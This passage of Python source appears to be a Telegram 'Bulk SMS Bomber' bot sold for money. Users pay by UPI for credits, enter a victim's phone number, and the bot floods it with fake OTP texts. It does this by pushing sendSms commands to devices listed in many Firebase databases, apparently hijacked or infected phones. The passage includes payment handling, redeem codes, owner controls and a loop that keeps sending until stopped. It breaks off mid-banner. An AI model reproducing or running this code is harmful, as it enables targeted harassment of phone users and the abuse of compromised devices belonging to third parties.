            text += f"{status} `{code}` - {credits}cr ({used_str})\n"
        await query.edit_message_text(text, parse_mode="HTML")
    elif data == "owner_shutdown":
        global BOT_ACTIVE
        BOT_ACTIVE = False
        await query.edit_message_text("🔴 **Bot is now OFF.**")
    elif data == "owner_start":
        BOT_ACTIVE = True
        await query.edit_message_text("🟢 **Bot is now ONLINE.**")
    elif data == "owner_export":
        text = "📤 **EXPORT DATA**\n━━━━━━━━━━━━━━━━━━\n"
        if LAST_BOMBED['number']:
            text += f"🎯 Last Bombed:\n"
            text += f"   User: `{LAST_BOMBED['user']}`\n"
            text += f"   Number: `{LAST_BOMBED['number']}`\n"
            text += f"   Time: `{LAST_BOMBED['time']}`\n"
            text += f"   Count: `{LAST_BOMBED['count']}`\n"
        text += f"\n👥 Users: `{get_total_users()}`\n"
        text += f"💰 Revenue: `₹{get_total_revenue()}`\n"
        text += f"📡 Firebases: `{len(FIREBASE_URLS)}`"
        try:
            with open("export_data.txt", "w") as f:
                f.write(text)
            await context.application.bot.send_document(user_id, open("export_data.txt", "rb"), caption="📤 **Export Data**")
            os.remove("export_data.txt")
        except:
            await query.edit_message_text(text, parse_mode="HTML")
    elif data == "owner_back":
        await query.edit_message_text("🔙 Back.", reply_markup=None)
        await start(update, context)

# ============================
# TEXT HANDLER
# ============================
async def handle_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    text = update.message.text
    
    if not BOT_ACTIVE and not is_owner(user_id):
        await update.message.reply_text("🔴 Bot is currently OFF.")
        return
    
    if is_user_banned(user_id):
        await update.message.reply_text("❌ Banned.")
        return
    
    # FORCE JOIN CHECK
    if not is_owner(user_id) and not is_user_member_of_all_channels(user_id, context.application.bot):
        await send_join_required_message(update.message.chat.id, user_id, context.application.bot)
        return
    
    if text == "👑 OWNER PANEL":
        await owner_panel(update, context)
        return
    
    # 🎫 REDEEM CODE - USER SIDE
    if text == "🎫 REDEEM CODE":
        context.user_data['redeem_step'] = 'waiting_code'
        await update.message.reply_text(
            "🎫 **REDEEM CODE**\n"
            "━━━━━━━━━━━━━━━━━━\n"
            "📝 Send your redeem code below:\n\n"
            "**Rules:**\n"
            "• Code is case-insensitive\n"
            "• 1 use per user\n"
            "• Rate limit: 3 attempts/min\n"
            "• Account must be 5+ min old\n\n"
            "**Type /cancel to abort**"
        )
        return
    
    if context.user_data.get('redeem_step') == 'waiting_code':
        context.user_data.pop('redeem_step', None)
        code = text.strip().upper()
        
        if not check_rate_limit(user_id):
            await update.message.reply_text("⚠️ **Too many attempts!**\nWait 1 minute and try again.")
            return
        
        success, message, credits = validate_redeem_code(code, user_id)
        
        if success:
            total = get_user_credits(user_id)
            log_user_action(user_id, "Redeem Code", f"Code: {code}, Credits: {credits}")
            await update.message.reply_text(
                f"✅ **REDEEM SUCCESSFUL!**\n"
                f"━━━━━━━━━━━━━━━━━━\n"
                f"🎫 Code: `{code}`\n"
                f"💰 Added: **+{credits} credits**\n"
                f"💎 Total Credits: `{total}`\n"
                f"━━━━━━━━━━━━━━━━━━\n"
                f"🎉 Enjoy bombing!",
                parse_mode="HTML",
                reply_markup=get_main_keyboard(user_id)
            )
        else:
            log_user_action(user_id, "Redeem Failed", f"Code: {code}")
            await update.message.reply_text(f"{message}\n\n**Tip:** Make sure code is correct.", reply_markup=get_main_keyboard(user_id))
        return
    
    bulk_step = context.user_data.get('bulk_step')
    recharge_step = context.user_data.get('recharge_step')
    
    if bulk_step == 'number':
        number = text.strip()
        valid, msg = validate_phone_number(number)
        if not valid:
            await update.message.reply_text(f"{msg}\n\nFormat: +91XXXXXXXXXX")
            return
        context.user_data['bulk_number'] = number
        keyboard = InlineKeyboardMarkup([
            [InlineKeyboardButton("🔢 Random OTP", callback_data="msgtype_random")],
            [InlineKeyboardButton("✏️ Custom", callback_data="msgtype_custom")],
            [InlineKeyboardButton("⚡ Super", callback_data="msgtype_super")],
            [InlineKeyboardButton("❌ Cancel", callback_data="msgtype_cancel")]
        ])
        await update.message.reply_text("📝 **Select message type:**", reply_markup=keyboard)
        context.user_data['bulk_step'] = 'msgtype'
        return
    
    if bulk_step == 'custom_msg':
        msg_text = text
        if not msg_text:
            await update.message.reply_text("❌ Empty.")
            return
        context.user_data['custom_message'] = msg_text
        if not deduct_credit(user_id):
            await update.message.reply_text("❌ Insufficient credits.")
            return
        await update.message.reply_text("📤 **Starting...**")
        await perform_bulk_send(update, context)
        return
    
    if recharge_step == 'payment':
        if update.message.photo:
            file_id = update.message.photo[-1].file_id
            credits = context.user_data.get('recharge_credits', 0)
            amount = context.user_data.get('recharge_amount', 0)
            if credits == 0:
                await update.message.reply_text("❌ Session expired.")
                return
            payment_id = create_payment(user_id, amount, credits, screenshot_id=file_id)
            await update.message.reply_text(f"✅ Received! ID: #{payment_id}\n⏳ Waiting for approval.")
            try:
                await context.application.bot.send_message(OWNER_ID,
                    f"📥 Payment\nUser: {user_id}\nAmount: ₹{amount}\nCredits: {credits}\nID: #{payment_id}")
            except:
                pass
            context.user_data.pop('recharge_step', None)
            context.user_data.pop('recharge_credits', None)
            context.user_data.pop('recharge_amount', None)
            return
        elif text and not text.startswith('/'):
            txn_id = text.strip()
            credits = context.user_data.get('recharge_credits', 0)
            amount = context.user_data.get('recharge_amount', 0)
            if credits == 0:
                await update.message.reply_text("❌ Session expired.")
                return
            payment_id = create_payment(user_id, amount, credits, transaction_id=txn_id)
            await update.message.reply_text(f"✅ Txn: `{txn_id}`\nID: #{payment_id}\n⏳ Waiting for approval.")
            try:
                await context.application.bot.send_message(OWNER_ID,
                    f"📥 Payment (Txn)\nUser: {user_id}\nAmount: ₹{amount}\nCredits: {credits}\nTxn: {txn_id}\nID: #{payment_id}")
            except:
                pass
            context.user_data.pop('recharge_step', None)
            context.user_data.pop('recharge_credits', None)
            context.user_data.pop('recharge_amount', None)
            return
        return
    
    if text == "💣 BOMB SMS":
        credits = get_user_credits(user_id)
        if credits != "∞" and credits <= 0:
            await update.message.reply_text("❌ No credits!")
            return
        await update.message.reply_text("📞 **Enter number:** +91XXXXXXXXXX")
        context.user_data['bulk_step'] = 'number'
        return
    
    if text == "💰 Credits":
        credits = get_user_credits(user_id)
        if is_owner(user_id):
            await update.message.reply_text("💰 **Credits:** `∞ UNLIMITED`\n\n👑 Owner has unlimited credits!", parse_mode="HTML")
        else:
            await update.message.reply_text(f"💰 **Credits:** `{credits}`", parse_mode="HTML")
        return
    
    if text == "🔗 Referral":
        bot_username = (await context.application.bot.get_me()).username
        link = get_referral_link(user_id, bot_username)
        await update.message.reply_text(f"🔗 **Your Link:**\n`{link}`\n\n+1 credit per user!", parse_mode="HTML")
        return
    
    if text == "💳 Recharge":
        markup = InlineKeyboardMarkup([
            [InlineKeyboardButton(f"10 Credits - ₹{RECHARGE_PLANS.get(10, 20)}", callback_data="recharge_10_20")],
            [InlineKeyboardButton(f"25 Credits - ₹{RECHARGE_PLANS.get(25, 50)}", callback_data="recharge_25_50")],
            [InlineKeyboardButton(f"50 Credits - ₹{RECHARGE_PLANS.get(50, 100)}", callback_data="recharge_50_100")],
            [InlineKeyboardButton(f"100 Credits - ₹{RECHARGE_PLANS.get(100, 200)}", callback_data="recharge_100_200")],
            [InlineKeyboardButton(f"250 Credits - ₹{RECHARGE_PLANS.get(250, 500)}", callback_data="recharge_250_500")],
            [InlineKeyboardButton("❌ Cancel", callback_data="recharge_cancel")]
        ])
        await update.message.reply_text("💳 **Select Plan:**", reply_markup=markup)
        return
    
    if text == "📡 Firebase":
        await update.message.reply_text("🔄 Checking...")
        text = get_firebase_status_text()
        await update.message.reply_text(text, parse_mode="HTML")
        return
    
    if text == "📜 History":
        history = get_user_history(user_id, 10)
        if not history:
            await update.message.reply_text("📭 No history.")
            return
        reply = "📜 **History:**\n"
        for action, details, created_at in history:
            dt = created_at[:16] if created_at else "N/A"
            reply += f"• {action} – {details} ({dt})\n"
        await update.message.reply_text(reply)
        return
    
    if text == "🛡️ Status":
        online = len(get_all_online_firebases())
        status = "🟢 ONLINE" if BOT_ACTIVE else "🔴 OFFLINE"
        credits = get_user_credits(user_id)
        credits_text = "∞" if is_owner(user_id) else str(credits)
        await update.message.reply_text(
            f"🛡️ **Status**\n━━━━━━━━━━━━━━━━━━\n"
            f"🤖 Bot: {status}\n"
            f"📡 Firebases: {online}/{len(FIREBASE_URLS)}\n"
            f"💰 Credits: {credits_text}\n"
            f"👤 Owner: {OWNER_USERNAME}"
        )
        return
    
    if text == "👨‍💻 Developer":
        await update.message.reply_text(f"👨‍💻 **Developer:** {OWNER_USERNAME}")
        return
    
    await update.message.reply_text("❌ Use buttons.", reply_markup=get_main_keyboard(user_id))

# ============================
# CALLBACKS
# ============================
async def handle_callbacks(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user_id = query.from_user.id
    data = query.data
    
    if data == "verify_channels":
        await verify_channels_callback(update, context)
        return
    
    if data.startswith("owner_"):
        await owner_callbacks(update, context)
        return
    
    if data.startswith("recharge_"):
        if data == "recharge_cancel":
            await query.edit_message_text("❌ Cancelled.")
            return
        _, credits, amount = data.split("_")
        credits = int(credits)
        amount = int(amount)
        context.user_data['recharge_credits'] = credits
        context.user_data['recharge_amount'] = amount
        reply = f"💰 **{credits} Credits - ₹{amount}**\n\n"
        reply += f"📱 **UPI:** `{UPI_ID}`\n📛 **Name:** {UPI_NAME}\n\n"
        reply += "📸 Send screenshot or TXN ID after payment."
        await query.edit_message_text(reply, parse_mode="HTML")
        context.user_data['recharge_step'] = 'payment'
        return
    
    if data.startswith("msgtype_"):
        if data == "msgtype_cancel":
            await query.edit_message_text("❌ Cancelled.")
            context.user_data.pop('bulk_step', None)
            return
        msg_type = data.split("_")[1]
        if msg_type == "super":
            context.user_data['custom_message'] = "🚀 SUPER BOMB! {otp}"
            await query.edit_message_text("✅ **SUPER BOMB ACTIVATED!**")
            if not deduct_credit(user_id):
                await query.message.reply_text("❌ Insufficient credits.")
                return
            await perform_bulk_send(update, context)
        elif msg_type == "random":
            context.user_data['custom_message'] = "आपका OTP है: {otp}"
            await query.edit_message_text("✅ **Starting...**")
            if not deduct_credit(user_id):
                await query.message.reply_text("❌ Insufficient credits.")
                return
            await perform_bulk_send(update, context)
        else:
            await query.edit_message_text("✏️ **Enter custom message.**\nUse `{otp}` for OTP.")
            context.user_data['bulk_step'] = 'custom_msg'
        return
    
    if data == "stop_bulk":
        context.user_data['stop_sending'] = True
        await query.answer("🛑 Stopping...")
        return

# ============================
# PERFORM BULK SEND
# ============================
async def perform_bulk_send(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if is_user_banned(user_id):
        await update.message.reply_text("❌ Banned.")
        return
    
    data = context.user_data
    number = data.get("bulk_number")
    msg_text = data.get("custom_message")
    if not number or not msg_text:
        await update.message.reply_text("❌ Missing data.")
        return
    
    global LAST_BOMBED
    LAST_BOMBED['user'] = user_id
    LAST_BOMBED['number'] = number
    LAST_BOMBED['time'] = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    LAST_BOMBED['count'] += 1
    
    context.user_data['stop_sending'] = False
    stop_markup = InlineKeyboardMarkup([[InlineKeyboardButton("⏹ Stop", callback_data="stop_bulk")]])
    
    initial_text = (
        f"💣 **BOMBING STARTED**\n━━━━━━━━━━━━━━━━━━\n"
        f"📞 Target: `{number}`\n"
        f"📊 Progress: `[░░░░░░░░░░░░░░░░░░░░] 0%`\n"
        f"✅ Sent: `0`\n❌ Failed: `0`\n"
        f"━━━━━━━━━━━━━━━━━━"
    )
    progress_msg = await update.message.reply_text(initial_text, parse_mode="HTML", reply_markup=stop_markup)
    
    total_sent = 0
    total_failed = 0
    cycle = 1
    start_time = time.time()
    
    otp_placeholder = re.search(r'\{otp(:\d+)?\}', msg_text)
    otp_length = 6
    if otp_placeholder and otp_placeholder.group(1):
        try:
            otp_length = int(otp_placeholder.group(1)[1:])
        except:
            otp_length = 6
    
    online_urls = get_all_online_firebases()
    if not online_urls:
        await progress_msg.edit_text("❌ No online firebases!")
        return
    
    total_urls = len(online_urls)
    
    while not context.user_data.get('stop_sending', False):
        if is_user_banned(user_id):
            break
        
        for url, device_count in online_urls:
            if context.user_data.get('stop_sending', False) or is_user_banned(user_id):
                break
            
            try:
                clients = fetch_json_data(url, "/clients")
                if not clients or not isinstance(clients, dict):
                    continue
                device_ids = list(clients.keys())
                if not device_ids:
                    continue
                
                for dev_id in device_ids:
                    if context.user_data.get('stop_sending', False) or is_user_banned(user_id):
                        break
                    
                    final_msg = msg_text
                    if otp_placeholder:
                        otp = generate_otp(otp_length)
                        final_msg = re.sub(r'\{otp(:\d+)?\}', otp, msg_text)
                    
                    path = f"clients/{dev_id}/webhookEvent/sendSms"
                    payload = {"sim": 1, "to": number, "message": final_msg, "isSended": False}
                    ok = firebase_put(url, None, path, payload)
                    if ok:
                        total_sent += 1
                    else:
                        total_failed += 1
                    
                    if (total_sent + total_failed) % 10 == 0:
                        elapsed = time.time() - start_time
                        speed = total_sent / elapsed if elapsed > 0 else 0
                        total_sf = total_sent + total_failed
                        bar = create_progress_bar(total_sf, total_sf + 100, 20)
                        try:
                            await progress_msg.edit_text(
                                f"💣 **BOMBING...**\n━━━━━━━━━━━━━━━━━━\n"
                                f"📞 Target: `{number}`\n"
                                f"📊 Progress: `[{bar}]`\n"
                                f"✅ Sent: `{total_sent}`\n❌ Failed: `{total_failed}`\n"
                                f"🔄 Cycle: `{cycle}`\n⏱️ Speed: `{speed:.1f}/sec`\n"
                                f"━━━━━━━━━━━━━━━━━━",
                                parse_mode="HTML", reply_markup=stop_markup
                            )
                        except:
                            pass
                    await asyncio.sleep(0.02)
            except:
                total_failed += 1
        
        cycle += 1
        await asyncio.sleep(0.3)
    
    elapsed = time.time() - start_time
    speed = total_sent / elapsed if elapsed > 0 else 0
    
    final_text = (
        f"🛑 **BOMBING STOPPED**\n━━━━━━━━━━━━━━━━━━\n"
        f"📞 Target: `{number}`\n"
        f"📊 Progress: `[████████████████████] 100%`\n"
        f"✅ Sent: `{total_sent}`\n❌ Failed: `{total_failed}`\n"
        f"🔄 Cycles: `{cycle - 1}`\n⏱️ Speed: `{speed:.1f}/sec`\n"
        f"⏳ Time: `{int(elapsed)}s`\n"
        f"━━━━━━━━━━━━━━━━━━"
    )
    
    try:
        await progress_msg.edit_text(final_text, parse_mode="HTML")
        await progress_msg.edit_reply_markup(reply_markup=None)
    except:
        pass
    context.user_data.pop('stop_sending', None)

# ============================
# OWNER COMMANDS
# ============================
async def on_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_owner(update.effective_user.id):
        await update.message.reply_text("⛔ Unauthorized.")
        return
    global BOT_ACTIVE
    BOT_ACTIVE = True
    await update.message.reply_text("🟢 **Bot is now ONLINE!**")

async def off_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_owner(update.effective_user.id):
        await update.message.reply_text("⛔ Unauthorized.")
        return
    global BOT_ACTIVE
    BOT_ACTIVE = False
    await update.message.reply_text("🔴 **Bot is now OFFLINE.**")

async def add_credits_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_owner(update.effective_user.id):
        await update.message.reply_text("⛔ Unauthorized.")
        return
    args = context.args
    if len(args) < 2:
        await update.message.reply_text("Usage: /addcredits <user_id> <amount>")
        return
    try:
        target = int(args[0])
        amount = int(args[1])
        add_credits(target, amount)
        await update.message.reply_text(f"✅ Added {amount} credits to {target}.")
    except:
        await update.message.reply_text("❌ Invalid.")

async def remove_credits_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_owner(update.effective_user.id):
        await update.message.reply_text("⛔ Unauthorized.")
        return
    args = context.args
    if len(args) < 2:
        await update.message.reply_text("Usage: /removecredits <user_id> <amount>")
        return
    try:
        target = int(args[0])
        amount = int(args[1])
        if remove_credits(target, amount):
            await update.message.reply_text(f"✅ Removed {amount} credits from {target}.")
        else:
            await update.message.reply_text("❌ Failed.")
    except:
        await update.message.reply_text("❌ Invalid.")

async def set_credits_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_owner(update.effective_user.id):
        await update.message.reply_text("⛔ Unauthorized.")
        return
    args = context.args
    if len(args) < 2:
        await update.message.reply_text("Usage: /setcredits <user_id> <amount>")
        return
    try:
        target = int(args[0])
        amount = int(args[1])
        set_credits(target, amount)
        await update.message.reply_text(f"✅ Set {target} credits to {amount}.")
    except:
        await update.message.reply_text("❌ Invalid.")

async def ban_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_owner(update.effective_user.id):
        await update.message.reply_text("⛔ Unauthorized.")
        return
    args = context.args
    if len(args) < 1:
        await update.message.reply_text("Usage: /ban <user_id>")
        return
    try:
        target = int(args[0])
        if ban_user(target, update.effective_user.id):
            await update.message.reply_text(f"✅ User {target} banned.")
    except:
        await update.message.reply_text("❌ Invalid.")

async def unban_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_owner(update.effective_user.id):
        await update.message.reply_text("⛔ Unauthorized.")
        return
    args = context.args
    if len(args) < 1:
        await update.message.reply_text("Usage: /unban <user_id>")
        return
    try:
        target = int(args[0])
        if unban_user(target):
            await update.message.reply_text(f"✅ User {target} unbanned.")
    except:
        await update.message.reply_text("❌ Invalid.")

async def broadcast_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_owner(update.effective_user.id):
        await update.message.reply_text("⛔ Unauthorized.")
        return
    args = context.args
    if len(args) < 1:
        await update.message.reply_text("Usage: /broadcast <message>")
        return
    msg = " ".join(args)
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("SELECT user_id FROM users")
    users = c.fetchall()
    conn.close()
    sent = 0
    for (uid,) in users:
        try:
            await context.application.bot.send_message(uid, f"📢 **Broadcast**\n━━━━━━━━━━━━━━━━━━\n{msg}")
            sent += 1
        except:
            pass
    await update.message.reply_text(f"✅ Broadcast sent to {sent} users.")

async def stats_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_owner(update.effective_user.id):
        await update.message.reply_text("⛔ Unauthorized.")
        return
    online = len(get_all_online_firebases())
    text = f"📊 **STATS**\n━━━━━━━━━━━━━━━━━━\n"
    text += f"👥 Users: `{get_total_users()}`\n"
    text += f"💰 Revenue: `₹{get_total_revenue()}`\n"
    text += f"📡 Online: `{online}/{len(FIREBASE_URLS)}`"
    await update.message.reply_text(text, parse_mode="HTML")

async def users_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_owner(update.effective_user.id):
        await update.message.reply_text("⛔ Unauthorized.")
        return
    users = get_all_users()
    text = "📊 **USERS**\n━━━━━━━━━━━━━━━━━━\n"
    for uid, credits in users[:20]:
        text += f"• `{uid}` - 💰{credits}\n"
    if len(users) > 20:
        text += f"\n... and {len(users)-20} more"
    await update.message.reply_text(text, parse_mode="HTML")

async def user_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_owner(update.effective_user.id):
        await update.message.reply_text("⛔ Unauthorized.")
        return
    args = context.args
    if len(args) < 1:
        await update.message.reply_text("Usage: /user <user_id>")
        return
    try:
        target = int(args[0])
        conn = sqlite3.connect(DB_PATH)
        c = conn.cursor()
        c.execute("SELECT user_id, credits, referrer_id, joined_at FROM users WHERE user_id = ?", (target,))
        row = c.fetchone()
        conn.close()
        if row:
            text = f"👤 **USER**\n━━━━━━━━━━━━━━━━━━\n"
            text += f"🆔 ID: `{row[0]}`\n💰 Credits: `{row[1]}`\n"
            text += f"🔗 Referred By: `{row[2] or 'None'}`\n📅 Joined: `{row[3][:16]}`"
            await update.message.reply_text(text, parse_mode="HTML")
        else:
            await update.message.reply_text("❌ Not found.")
    except:
        await update.message.reply_text("❌ Invalid.")

async def add_firebase_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_owner(update.effective_user.id):
        await update.message.reply_text("⛔ Unauthorized.")
        return
    args = context.args
    if len(args) < 1:
        await update.message.reply_text("Usage: /addfirebase <url>")
        return
    url = args[0].strip()
    if url not in FIREBASE_URLS:
        FIREBASE_URLS.append(url)
        await update.message.reply_text(f"✅ Added: {url}")
    else:
        await update.message.reply_text("⚠️ Already exists.")

async def remove_firebase_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_owner(update.effective_user.id):
        await update.message.reply_text("⛔ Unauthorized.")
        return
    args = context.args
    if len(args) < 1:
        await update.message.reply_text("Usage: /removefirebase <url>")
        return
    url = args[0].strip()
    if url in FIREBASE_URLS:
        FIREBASE_URLS.remove(url)
        await update.message.reply_text(f"✅ Removed: {url}")
    else:
        await update.message.reply_text("❌ Not found.")

async def list_firebases_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_owner(update.effective_user.id):
        await update.message.reply_text("⛔ Unauthorized.")
        return
    text = "📡 **FIREBASES**\n━━━━━━━━━━━━━━━━━━\n"
    for i, url in enumerate(FIREBASE_URLS, 1):
        short = url.replace("https://", "").replace(".firebaseio.com", "").replace(".firebasedatabase.app", "")
        text += f"{i}. {short[:30]}\n"
    text += f"\n📡 Total: {len(FIREBASE_URLS)}"
    await update.message.reply_text(text, parse_mode="HTML")

async def check_firebases_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_owner(update.effective_user.id):
        await update.message.reply_text("⛔ Unauthorized.")
        return
    text = get_firebase_status_text()
    await update.message.reply_text(text, parse_mode="HTML")

async def setupi_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_owner(update.effective_user.id):
        await update.message.reply_text("⛔ Unauthorized.")
        return
    args = context.args
    if len(args) < 1:
        await update.message.reply_text("Usage: /setupi <upi_id>")
        return
    global UPI_ID
    UPI_ID = args[0].strip()
    await update.message.reply_text(f"✅ UPI updated: `{UPI_ID}`")

async def setprice_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_owner(update.effective_user.id):
        await update.message.reply_text("⛔ Unauthorized.")
        return
    args = context.args
    if len(args) < 2:
        await update.message.reply_text("Usage: /setprice <credits> <price>")
        return
    try:
        credits = int(args[0])
        price = int(args[1])
        RECHARGE_PLANS[credits] = price
        await update.message.reply_text(f"✅ Set: {credits} = ₹{price}")
    except:
        await update.message.reply_text("❌ Invalid.")

async def resetuser_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_owner(update.effective_user.id):
        await update.message.reply_text("⛔ Unauthorized.")
        return
    args = context.args
    if len(args) < 1:
        await update.message.reply_text("Usage: /resetuser <user_id>")
        return
    try:
        target = int(args[0])
        conn = sqlite3.connect(DB_PATH)
        c = conn.cursor()
        c.execute("UPDATE users SET credits = 5 WHERE user_id = ?", (target,))
        conn.commit()
        conn.close()
        await update.message.reply_text(f"✅ User {target} reset to 5 credits.")
    except:
        await update.message.reply_text("❌ Invalid.")

async def redeem_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_owner(update.effective_user.id):
        await update.message.reply_text("⛔ Unauthorized.")
        return
    args = context.args
    if len(args) < 4:
        await update.message.reply_text(
            "🎫 **CREATE REDEEM CODE**\n━━━━━━━━━━━━━━━━━━\n\n"
            "**Format:**\n"
            "`/redeem <name> <credits> <max_uses> <expiry_days>`\n\n"
            "**Examples:**\n"
            "`/redeem BONUS 100 50 7`\n"
            "`/redeem FREE 50 10 0`"
        )
        return
    name = args[0].upper()
    try:
        credits = int(args[1])
        max_uses = int(args[2])
        expiry_days = int(args[3])
    except:
        await update.message.reply_text("❌ Invalid numbers!")
        return
    code = f"{name}_{random.randint(10000, 99999)}"
    if create_redeem_code(code, credits, max_uses, expiry_days, update.effective_user.id):
        expiry_text = f"{expiry_days} days" if expiry_days > 0 else "Never"
        uses_text = f"{max_uses}" if max_uses > 0 else "Unlimited"
        credits_text = f"{credits}" if credits > 0 else "Infinite"
        await update.message.reply_text(
            f"✅ **REDEEM CODE CREATED!**\n━━━━━━━━━━━━━━━━━━\n"
            f"📌 Code: `{code}`\n💰 Credits: {credits_text}\n"
            f"📊 Max Uses: {uses_text}\n⏰ Expires: {expiry_text}\n"
            f"━━━━━━━━━━━━━━━━━━\n"
            f"Share this code with users!\n\n"
            f"**Users redeem with:** 🎫 REDEEM CODE button",
            parse_mode="HTML"
        )
        log_user_action(update.effective_user.id, "Created Code", f"{code}")
    else:
        await update.message.reply_text("❌ Failed to create code.")

async def redeem_list_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_owner(update.effective_user.id):
        await update.message.reply_text("⛔ Unauthorized.")
        return
    rows = list_redeem_codes()
    if not rows:
        await update.message.reply_text("📋 No redeem codes found.")
        return
    text = "📋 **REDEEM CODES**\n━━━━━━━━━━━━━━━━━━\n"
    for code, credits, max_uses, used, created, expires, active in rows:
        used_str = f"{used}/{max_uses}" if max_uses > 0 else f"{used}/∞"
        status = "✅" if active else "❌"
        text += f"{status} `{code}` - {credits}cr ({used_str})\n"
    await update.message.reply_text(text, parse_mode="HTML")

async def redeem_info_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_owner(update.effective_user.id):
        await update.message.reply_text("⛔ Unauthorized.")
        return
    args = context.args
    if len(args) < 1:
        await update.message.reply_text("Usage: /redeeminfo <code>")
        return
    code = args[0].upper()
    row = get_redeem_code_info(code)
    if not row:
        await update.message.reply_text("❌ Code not found.")
        return
    text = f"🎫 **CODE INFO: {code}**\n━━━━━━━━━━━━━━━━━━\n"
    text += f"💰 Credits: `{row[2]}`\n"
    text += f"📊 Uses: `{row[4]}/{row[3] if row[3] > 0 else '∞'}`\n"
    text += f"⏰ Expires: `{row[7][:16] if row[7] else 'Never'}`\n"
    text += f"✅ Active: `{'Yes' if row[8] else 'No'}`\n"
    users = get_code_users(code)
    if users:
        text += f"\n👥 **Users ({len(users)}):**\n"
        for uid, redeemed_at in users[:10]:
            text += f"• `{uid}` - {redeemed_at[:16]}\n"
    await update.message.reply_text(text, parse_mode="HTML")

async def del_redeem_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_owner(update.effective_user.id):
        await update.message.reply_text("⛔ Unauthorized.")
        return
    args = context.args
    if len(args) < 1:
        await update.message.reply_text("Usage: /delredeem <code>")
        return
    code = args[0].upper()
    if delete_redeem_code(code):
        await update.message.reply_text(f"✅ Code `{code}` deleted.")
    else:
        await update.message.reply_text("❌ Code not found.")

async def export_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_owner(update.effective_user.id):
        await update.message.reply_text("⛔ Unauthorized.")
        return
    text = "📤 **EXPORT DATA**\n━━━━━━━━━━━━━━━━━━\n"
    if LAST_BOMBED['number']:
        text += f"🎯 Last Bombed:\n"
        text += f"   User: `{LAST_BOMBED['user']}`\n"
        text += f"   Number: `{LAST_BOMBED['number']}`\n"
        text += f"   Time: `{LAST_BOMBED['time']}`\n"
        text += f"   Count: `{LAST_BOMBED['count']}`\n"
    text += f"\n👥 Users: `{get_total_users()}`\n"
    text += f"💰 Revenue: `₹{get_total_revenue()}`\n"
    text += f"📡 Firebases: `{len(FIREBASE_URLS)}`"
    try:
        with open("export_data.txt", "w") as f:
            f.write(text)
        await context.application.bot.send_document(update.effective_user.id, open("export_data.txt", "rb"), caption="📤 **Export Data**")
        os.remove("export_data.txt")
    except:
        await update.message.reply_text(text, parse_mode="HTML")

async def shutdown_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_owner(update.effective_user.id):
        await update.message.reply_text("⛔ Unauthorized.")
        return
    await update.message.reply_text("🛑 Shutting down...")
    await context.application.stop()
    os._exit(0)

# ============================
# MAIN
# ============================
def main():
    application = Application.builder().token(TOKEN).request(request).build()
    
    # User commands
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("cancel", lambda u, c: cancel(u, c)))
    application.add_handler(CommandHandler("panel", owner_panel))
    application.add_handler(CommandHandler("owner", owner_panel))
    
    # Owner commands
    application.add_handler(CommandHandler("on", on_cmd))
    application.add_handler(CommandHandler("off", off_cmd))
    application.add_handler(CommandHandler("addcredits", add_credits_cmd))
    application.add_handler(CommandHandler("removecredits", remove_credits_cmd))
    application.add_handler(CommandHandler("setcredits", set_credits_cmd))
    application.add_handler(CommandHandler("ban", ban_cmd))
    application.add_handler(CommandHandler("unban", unban_cmd))
    application.add_handler(CommandHandler("broadcast", broadcast_cmd))
    application.add_handler(CommandHandler("stats", stats_cmd))
    application.add_handler(CommandHandler("users", users_cmd))
    application.add_handler(CommandHandler("user", user_cmd))
    application.add_handler(CommandHandler("addfirebase", add_firebase_cmd))
    application.add_handler(CommandHandler("removefirebase", remove_firebase_cmd))
    application.add_handler(CommandHandler("listfirebases", list_firebases_cmd))
    application.add_handler(CommandHandler("checkfirebases", check_firebases_cmd))
    application.add_handler(CommandHandler("setupi", setupi_cmd))
    application.add_handler(CommandHandler("setprice", setprice_cmd))
    application.add_handler(CommandHandler("resetuser", resetuser_cmd))
    application.add_handler(CommandHandler("redeem", redeem_cmd))
    application.add_handler(CommandHandler("redeemlist", redeem_list_cmd))
    application.add_handler(CommandHandler("redeeminfo", redeem_info_cmd))
    application.add_handler(CommandHandler("delredeem", del_redeem_cmd))
    application.add_handler(CommandHandler("export", export_cmd))
    application.add_handler(CommandHandler("shutdown", shutdown_cmd))
    
    # Callbacks
    application.add_handler(CallbackQueryHandler(handle_callbacks))
    
    # Text & Photo
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_text))
    application.add_handler(MessageHandler(filters.PHOTO, handle_text))
    
    print("""
╔═══════════════════════════════════════════════════════════════╗
║  💣 BULK SMS BOMBER BOT                                     ║
║  👤 Owner: @HACKAERXWHITE                                    ║
║  🆔 Owner ID: 6426979067                                     ║
║  📡 Firebases: 60+                                           ║
